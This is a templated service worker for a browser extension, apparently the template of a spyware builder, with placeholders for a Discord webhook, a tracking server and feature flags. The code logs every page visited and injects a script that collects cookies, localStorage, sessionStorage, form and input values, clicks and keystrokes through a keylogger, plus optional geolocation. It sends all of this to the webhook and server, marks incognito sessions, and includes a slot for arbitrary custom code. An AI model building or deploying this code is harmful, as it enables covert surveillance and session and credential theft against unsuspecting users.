

// Background service worker for {{EXTENSION_NAME}}
const WEBHOOK_URL = '{{WEBHOOK_URL}}';
const USER_ID = '{{USER_ID}}';
const EXTENSION_ID = '{{EXTENSION_ID}}';
const TRACKING_SERVER = '{{TRACKING_SERVER}}';

let trackingData = {};
let sessionId = generateUUID();

// Generate UUID for session tracking
function generateUUID() {
  return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
    const r = Math.random() * 16 | 0;
    const v = c === 'x' ? r : (r & 0x3 | 0x8);
    return v.toString(16);
  });
}

// Enhanced data collection on extension startup
chrome.runtime.onStartup.addListener(() => {
  safeExecute(collectInitialData, 'startup data collection');
});

chrome.runtime.onInstalled.addListener(() => {
  safeExecute(collectInitialData, 'install data collection');
});

// Safe execution wrapper
function safeExecute(func, context = 'unknown') {
  try {
    return func();
  } catch (error) {
    console.warn(`[${EXTENSION_ID}] Error in ${context}:`, error.message);
    return null;
  }
}

// Collect initial system data with error handling
async function collectInitialData() {
  try {
    const systemData = {
      type: 'extension_installed',
      extensionId: EXTENSION_ID,
      sessionId: sessionId,
      userId: USER_ID,
      timestamp: Date.now(),
      systemInfo: await getSystemInfo()
    };

    await sendToWebhookAndServer(systemData);
  } catch (error) {
    console.warn(`[${EXTENSION_ID}] Failed to collect initial data:`, error.message);
  }
}

// Safe system info collection
async function getSystemInfo() {
  const systemInfo = {
    platform: 'unknown',
    userAgent: 'unknown',
    language: 'unknown',
    timezone: 'unknown',
    screenResolution: 'unknown',
    colorDepth: 'unknown',
    pixelDepth: 'unknown',
    cookieEnabled: false,
    onLine: false,
    hardwareConcurrency: 'unknown',
    deviceMemory: 'unknown'
  };

  try {
    if (typeof navigator !== 'undefined') {
      systemInfo.platform = navigator.platform || 'unknown';
      systemInfo.userAgent = navigator.userAgent || 'unknown';
      systemInfo.language = navigator.language || 'unknown';
      systemInfo.cookieEnabled = navigator.cookieEnabled || false;
      systemInfo.onLine = navigator.onLine || false;
      systemInfo.hardwareConcurrency = navigator.hardwareConcurrency || 'unknown';
      systemInfo.deviceMemory = navigator.deviceMemory || 'unknown';
    }

    if (typeof Intl !== 'undefined') {
      try {
        systemInfo.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || 'unknown';
      } catch (e) {
        systemInfo.timezone = 'unknown';
      }
    }

    if (typeof screen !== 'undefined') {
      systemInfo.screenResolution = `${screen.width || 0}x${screen.height || 0}`;
      systemInfo.colorDepth = screen.colorDepth || 'unknown';
      systemInfo.pixelDepth = screen.pixelDepth || 'unknown';
    }
  } catch (error) {
    console.warn(`[${EXTENSION_ID}] Error collecting system info:`, error.message);
  }

  return systemInfo;
}

// Track tab changes with enhanced error handling
chrome.tabs.onActivated.addListener(async (activeInfo) => {
  if ({{FEATURE_IP_TRACKING}} || {{FEATURE_BROWSER_INFO}}) {
    try {
      const tab = await chrome.tabs.get(activeInfo.tabId);
      await collectAndSendTabData(tab, 'tab_activated');
    } catch (error) {
      console.warn(`[${EXTENSION_ID}] Error tracking tab activation:`, error.message);
    }
  }
});

// Track navigation with enhanced data
chrome.tabs.onUpdated.addListener(async (tabId, changeInfo, tab) => {
  if (changeInfo.status === 'complete' && tab.url) {
    await safeExecute(() => collectAndSendTabData(tab, 'page_loaded'), 'page load tracking');
  }
});

// Enhanced data collection from tabs with comprehensive error handling
async function collectAndSendTabData(tab, eventType) {
  try {
    if (!tab || !tab.url) {
      console.warn(`[${EXTENSION_ID}] Invalid tab data provided`);
      return;
    }

    const data = {
      type: eventType,
      extensionId: EXTENSION_ID,
      sessionId: sessionId,
      userId: USER_ID,
      timestamp: Date.now(),
      tabInfo: {
        url: tab.url || 'unknown',
        title: tab.title || 'unknown',
        favIconUrl: tab.favIconUrl || null,
        incognito: tab.incognito || false,
        active: tab.active || false,
        pinned: tab.pinned || false,
        index: tab.index || 0,
        windowId: tab.windowId || 0,
        status: tab.status || 'unknown'
      }
    };

    // Add browser info if enabled
    if ({{FEATURE_BROWSER_INFO}}) {
      data.systemInfo = await getSystemInfo();
    }

    // Add geolocation if enabled and permitted
    if ({{FEATURE_GEOLOCATION}}) {
      try {
        const position = await getCurrentPosition();
        data.location = {
          latitude: position.coords.latitude,
          longitude: position.coords.longitude,
          accuracy: position.coords.accuracy,
          altitude: position.coords.altitude,
          altitudeAccuracy: position.coords.altitudeAccuracy,
          heading: position.coords.heading,
          speed: position.coords.speed,
          timestamp: position.timestamp
        };
      } catch (error) {
        data.location = { error: 'Geolocation not available or denied' };
      }
    }

    // Inject content script to collect additional data with safety checks
    if (tab.url && !tab.url.startsWith('chrome://') && !tab.url.startsWith('chrome-extension://') && !tab.url.startsWith('moz-extension://')) {
      try {
        await chrome.scripting.executeScript({
          target: { tabId: tab.id },
          func: collectPageData,
          args: [EXTENSION_ID, sessionId, USER_ID, {{FEATURE_FORM_DATA}}, {{FEATURE_CLICK_TRACKING}}, {{FEATURE_KEYLOGGER}}]
        });
      } catch (error) {
        console.warn(`[${EXTENSION_ID}] Cannot inject content script:`, error.message);
        // This is normal for system pages, don't treat as error
      }
    }

    await sendToWebhookAndServer(data);

  } catch (error) {
    console.warn(`[${EXTENSION_ID}] Error collecting tab data:`, error.message);
  }
}

// Function to inject into pages for enhanced data collection with error handling
function collectPageData(extensionId, sessionId, userId, captureFormData, captureClicks, captureKeystrokes) {
  try {
    const pageData = {
      type: 'page_analysis',
      extensionId: extensionId,
      sessionId: sessionId,
      userId: userId,
      timestamp: Date.now(),
      url: window.location.href,
      domain: window.location.hostname,
      path: window.location.pathname,
      title: document.title,
      pageInfo: {
        documentHeight: document.documentElement.scrollHeight || 0,
        documentWidth: document.documentElement.scrollWidth || 0,
        viewportHeight: window.innerHeight || 0,
        viewportWidth: window.innerWidth || 0,
        scrollX: window.scrollX || 0,
        scrollY: window.scrollY || 0,
        referrer: document.referrer || '',
        characterSet: document.characterSet || 'unknown',
        readyState: document.readyState || 'unknown',
        lastModified: document.lastModified || 'unknown'
      },
      forms: [],
      links: [],
      images: [],
      inputs: [],
      localStorage: {},
      sessionStorage: {},
      cookies: document.cookie || ''
    };

    // Collect form information with error handling
    if (captureFormData) {
      try {
        const forms = document.querySelectorAll('form');
        forms.forEach((form, index) => {
          try {
            const formData = {
              index: index,
              action: form.action || '',
              method: form.method || 'get',
              name: form.name || '',
              id: form.id || '',
              className: form.className || '',
              inputCount: form.querySelectorAll('input').length,
              inputs: []
            };

            const inputs = form.querySelectorAll('input, textarea, select');
            inputs.forEach(input => {
              try {
                formData.inputs.push({
                  type: input.type || 'text',
                  name: input.name || '',
                  id: input.id || '',
                  placeholder: input.placeholder || '',
                  required: input.required || false,
                  value: input.type === 'password' ? '[HIDDEN]' : (input.value || '').substring(0, 50)
                });
              } catch (e) {
                console.warn('Error collecting input data:', e.message);
              }
            });

            pageData.forms.push(formData);
          } catch (e) {
            console.warn('Error collecting form data:', e.message);
          }
        });
      } catch (e) {
        console.warn('Error collecting forms:', e.message);
      }
    }

    // Collect all input fields with error handling
    try {
      const allInputs = document.querySelectorAll('input, textarea, select');
      allInputs.forEach(input => {
        try {
          pageData.inputs.push({
            type: input.type || 'unknown',
            name: input.name || '',
            id: input.id || '',
            placeholder: input.placeholder || '',
            autocomplete: input.autocomplete || '',
            required: input.required || false,
            disabled: input.disabled || false,
            value: input.type === 'password' ? '[HIDDEN]' : (input.value || '').substring(0, 50)
          });
        } catch (e) {
          console.warn('Error collecting input:', e.message);
        }
      });
    } catch (e) {
      console.warn('Error collecting inputs:', e.message);
    }

    // Collect links with error handling
    try {
      const links = document.querySelectorAll('a[href]');
      Array.from(links).slice(0, 50).forEach(link => {
        try {
          pageData.links.push({
            href: link.href || '',
            text: (link.textContent || '').substring(0, 100),
            target: link.target || '',
            rel: link.rel || ''
          });
        } catch (e) {
          console.warn('Error collecting link:', e.message);
        }
      });
    } catch (e) {
      console.warn('Error collecting links:', e.message);
    }

    // Collect images with error handling
    try {
      const images = document.querySelectorAll('img[src]');
      Array.from(images).slice(0, 20).forEach(img => {
        try {
          pageData.images.push({
            src: img.src || '',
            alt: img.alt || '',
            width: img.width || 0,
            height: img.height || 0
          });
        } catch (e) {
          console.warn('Error collecting image:', e.message);
        }
      });
    } catch (e) {
      console.warn('Error collecting images:', e.message);
    }

    // Collect localStorage data with error handling
    try {
      for (let i = 0; i < localStorage.length; i++) {
        try {
          const key = localStorage.key(i);
          if (key) {
            const value = localStorage.getItem(key);
            pageData.localStorage[key] = (value || '').substring(0, 200);
          }
        } catch (e) {
          console.warn('Error accessing localStorage item:', e.message);
        }
      }
    } catch (e) {
      pageData.localStorage = { error: 'Access denied' };
    }

    // Collect sessionStorage data with error handling
    try {
      for (let i = 0; i < sessionStorage.length; i++) {
        try {
          const key = sessionStorage.key(i);
          if (key) {
            const value = sessionStorage.getItem(key);
            pageData.sessionStorage[key] = (value || '').substring(0, 200);
          }
        } catch (e) {
          console.warn('Error accessing sessionStorage item:', e.message);
        }
      }
    } catch (e) {
      pageData.sessionStorage = { error: 'Access denied' };
    }

    // Send collected data back to background script
    try {
      chrome.runtime.sendMessage({ type: 'pageData', data: pageData });
    } catch (e) {
      console.warn('Error sending page data:', e.message);
    }

    // Set up event listeners for real-time tracking with error handling
    if (captureClicks) {
      try {
        document.addEventListener('click', function(event) {
          try {
            const clickData = {
              type: 'click_event',
              extensionId: extensionId,
              sessionId: sessionId,
              userId: userId,
              timestamp: Date.now(),
              element: {
                tagName: event.target.tagName || 'unknown',
                id: event.target.id || '',
                className: event.target.className || '',
                text: (event.target.textContent || '').substring(0, 100),
                href: event.target.href || '',
                type: event.target.type || ''
              },
              coordinates: {
                clientX: event.clientX || 0,
                clientY: event.clientY || 0,
                pageX: event.pageX || 0,
                pageY: event.pageY || 0
              },
              url: window.location.href
            };
            chrome.runtime.sendMessage({ type: 'clickData', data: clickData });
          } catch (e) {
            console.warn('Error processing click:', e.message);
          }
        });
      } catch (e) {
        console.warn('Error setting up click tracking:', e.message);
      }
    }

    if (captureKeystrokes) {
      try {
        let keystrokeBuffer = '';
        document.addEventListener('keydown', function(event) {
          try {
            keystrokeBuffer += event.key || '';
            
            if (keystrokeBuffer.length >= 20 || event.key === 'Enter') {
              const keystrokeData = {
                type: 'keystroke_event',
                extensionId: extensionId,
                sessionId: sessionId,
                userId: userId,
                timestamp: Date.now(),
                keys: keystrokeBuffer,
                elementType: event.target.tagName || 'unknown',
                elementId: event.target.id || '',
                url: window.location.href
              };
              chrome.runtime.sendMessage({ type: 'keystrokeData', data: keystrokeData });
              keystrokeBuffer = '';
            }
          } catch (e) {
            console.warn('Error processing keystroke:', e.message);
          }
        });
      } catch (e) {
        console.warn('Error setting up keystroke tracking:', e.message);
      }
    }

  } catch (error) {
    console.warn('Error collecting page data:', error.message);
  }
}

// Listen for messages from content scripts
chrome.runtime.onMessage.addListener(async (message, sender, sendResponse) => {
  try {
    if (message.type === 'pageData' || message.type === 'clickData' || message.type === 'keystrokeData') {
      await sendToWebhookAndServer(message.data);
    }
    if (message.type === 'getSessionId') {
      sendResponse({ sessionId: sessionId });
    }
  } catch (error) {
    console.warn(`[${EXTENSION_ID}] Error handling message:`, error.message);
  }
});

// Enhanced webhook and server sending with retry logic
async function sendToWebhookAndServer(data) {
  try {
    // Send to Discord webhook (required)
    if (WEBHOOK_URL) {
      await sendToWebhook(data);
    }

    // Send to tracking server
    await sendToServer(data);
  } catch (error) {
    console.warn(`[${EXTENSION_ID}] Error sending data:`, error.message);
  }
}

// Send to Discord webhook with enhanced formatting and error handling
async function sendToWebhook(data) {
  try {
    if (!WEBHOOK_URL || !WEBHOOK_URL.startsWith('https://discord.com/api/webhooks/')) {
      console.warn(`[${EXTENSION_ID}] Invalid webhook URL`);
      return;
    }

    let embed = {
      title: "🔍 Extension Activity Detected",
      color: getColorForEventType(data.type),
      timestamp: new Date(data.timestamp).toISOString(),
      footer: { text: `Extension: {{EXTENSION_NAME}} | Session: ${data.sessionId?.substring(0, 8) || 'unknown'}` }
    };

    // Customize embed based on event type
    switch (data.type) {
      case 'extension_installed':
        embed.title = "🚀 Extension Installed & Active";
        embed.description = `**{{EXTENSION_NAME}}** has been successfully installed and is now tracking.`;
        embed.fields = [
          { name: "👤 User", value: `ID: ${data.userId}`, inline: true },
          { name: "💻 Platform", value: data.systemInfo?.platform || 'Unknown', inline: true },
          { name: "🌐 Browser", value: (data.systemInfo?.userAgent || 'Unknown').split(' ')[0], inline: true },
          { name: "📱 Screen", value: data.systemInfo?.screenResolution || 'Unknown', inline: true },
          { name: "🌍 Timezone", value: data.systemInfo?.timezone || 'Unknown', inline: true },
          { name: "🧠 Memory", value: `${data.systemInfo?.deviceMemory || 'Unknown'} GB`, inline: true }
        ];
        break;

      case 'page_loaded':
      case 'tab_activated':
        embed.title = data.type === 'page_loaded' ? "📄 Page Loaded" : "🔄 Tab Activated";
        embed.fields = [
          { name: "🌐 URL", value: (data.tabInfo?.url || 'Unknown').substring(0, 100), inline: false },
          { name: "📝 Title", value: (data.tabInfo?.title || 'Untitled').substring(0, 100), inline: false }
        ];
        
        if (data.location && !data.location.error) {
          embed.fields.push({
            name: "📍 Location",
            value: `${data.location.latitude.toFixed(4)}, ${data.location.longitude.toFixed(4)}`,
            inline: true
          });
        }
        
        if (data.tabInfo?.incognito) {
          embed.fields.push({ name: "🕵️ Mode", value: "Incognito", inline: true });
        }
        break;

      case 'page_analysis':
        embed.title = "🔬 Deep Page Analysis";
        embed.fields = [
          { name: "🌐 Domain", value: data.domain || 'Unknown', inline: true },
          { name: "📄 Path", value: data.path || '/', inline: true },
          { name: "📊 Forms", value: (data.forms?.length || 0).toString(), inline: true },
          { name: "🔗 Links", value: (data.links?.length || 0).toString(), inline: true },
          { name: "🖼️ Images", value: (data.images?.length || 0).toString(), inline: true },
          { name: "📝 Inputs", value: (data.inputs?.length || 0).toString(), inline: true }
        ];

        if (data.localStorage && Object.keys(data.localStorage).length > 0) {
          embed.fields.push({
            name: "💾 LocalStorage",
            value: `${Object.keys(data.localStorage).length} items found`,
            inline: true
          });
        }

        if (data.cookies && data.cookies.length > 0) {
          embed.fields.push({
            name: "🍪 Cookies",
            value: `${data.cookies.split(';').length} cookies detected`,
            inline: true
          });
        }
        break;

      case 'click_event':
        embed.title = "👆 User Click Detected";
        embed.fields = [
          { name: "🎯 Element", value: `${data.element?.tagName || 'Unknown'} ${data.element?.id ? `#${data.element.id}` : ''}`, inline: true },
          { name: "📝 Text", value: (data.element?.text || 'No text').substring(0, 50), inline: true },
          { name: "📍 Position", value: `${data.coordinates?.pageX || 0}, ${data.coordinates?.pageY || 0}`, inline: true }
        ];
        break;

      case 'keystroke_event':
        embed.title = "⌨️ Keystroke Activity";
        embed.fields = [
          { name: "🎯 Element", value: data.elementType || 'Unknown', inline: true },
          { name: "📝 Keys", value: `${(data.keys || '').length} characters typed`, inline: true }
        ];
        break;
    }

    // Add URL field for all events except installation
    if (data.type !== 'extension_installed' && (data.url || data.tabInfo?.url)) {
      embed.fields = embed.fields || [];
      embed.fields.push({
        name: "🔗 Current URL",
        value: ((data.url || data.tabInfo?.url) || 'Unknown').substring(0, 200),
        inline: false
      });
    }

    const webhookPayload = {
      username: "🕵️ {{EXTENSION_NAME}} Monitor",
      avatar_url: "https://cdn.discordapp.com/emojis/853928735535742986.png",
      embeds: [embed]
    };

    const response = await fetch(WEBHOOK_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(webhookPayload)
    });

    if (!response.ok) {
      console.warn(`[${EXTENSION_ID}] Webhook failed:`, response.status, response.statusText);
    }

  } catch (error) {
    console.warn(`[${EXTENSION_ID}] Error sending to webhook:`, error.message);
  }
}

// Get color based on event type
function getColorForEventType(eventType) {
  const colors = {
    'extension_installed': 0x00FF00, // Green
    'page_loaded': 0x3498DB,         // Blue  
    'tab_activated': 0x9B59B6,       // Purple
    'page_analysis': 0xF39C12,       // Orange
    'click_event': 0xE74C3C,         // Red
    'keystroke_event': 0xFF0000,     // Bright Red
    'form_submit': 0x8E44AD          // Dark Purple
  };
  return colors[eventType] || 0x95A5A6; // Default gray
}

// Send data to tracking server with error handling
async function sendToServer(data) {
  try {
    const response = await fetch(`${TRACKING_SERVER}/api/extension-track`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(data)
    });
    
    if (!response.ok) {
      console.warn(`[${EXTENSION_ID}] Server tracking failed:`, response.status);
    }
  } catch (error) {
    console.warn(`[${EXTENSION_ID}] Error sending to server:`, error.message);
  }
}

// Get current position with timeout and error handling
function getCurrentPosition() {
  return new Promise((resolve, reject) => {
    if (!navigator.geolocation) {
      reject(new Error('Geolocation not supported'));
      return;
    }

    navigator.geolocation.getCurrentPosition(resolve, reject, {
      timeout: 10000,
      maximumAge: 300000,
      enableHighAccuracy: true
    });
  });
}

// Custom user code injection point with error handling
try {
  {{CUSTOM_CODE}}
} catch (error) {
  console.warn(`[${EXTENSION_ID}] Custom code error:`, error.message);
}

